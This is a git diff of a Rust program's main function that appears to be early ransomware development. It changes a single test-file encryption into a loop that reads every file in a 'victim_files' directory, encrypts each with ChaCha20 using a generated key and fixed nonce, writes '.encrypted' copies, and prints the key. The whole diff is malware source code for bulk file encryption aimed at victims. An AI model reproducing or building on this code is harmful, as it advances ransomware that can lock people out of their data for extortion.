@@ -9,16 +9,21 @@ mod networking;
 
 
 fn main() {
-	let key = cryptography::chacha_import("1dif1PsoJsrk4a+ogwpUDlfHrR7SGhYBHJnASKMmn94=");
+	let key = chacha20::gen_key();
 	let nonce = chacha20::Nonce::from_slice(b"verygood").unwrap();
 
-	let plaintext = files::read_file("victim_files/test.txt").unwrap();
-	let ciphertext = chacha20::stream_xor(&plaintext, &nonce, &key);
-	// let their_plaintext = chacha20::stream_xor(&ciphertext, &nonce, &key);
+	for file in files::list_files("victim_files").unwrap() {
+		let ext = file.extension().unwrap();
+		if ext != std::ffi::OsStr::new("encrypted") { // Skip file if it's already encrypted
+			let filename = file.to_str().unwrap();
+			let newfilename = format!("{}.encrypted", filename);
 
-	println!("{:?}\n", plaintext);
-	println!("{:?}\n", ciphertext);
-	// println!("{:?}", their_plaintext);
+			let plaintext = files::read_file(&filename).unwrap();
+			let encrypted = chacha20::stream_xor(&plaintext, &nonce, &key);
 
-	files::write_file("victim_files/test.txt.encrypted", ciphertext).expect("Error writing file.");
+			files::write_file(&newfilename, &encrypted).expect("Error writing file");
+		}
+	}
+
+	println!("KEY: {:?}", cryptography::chacha_export(&key));
 }
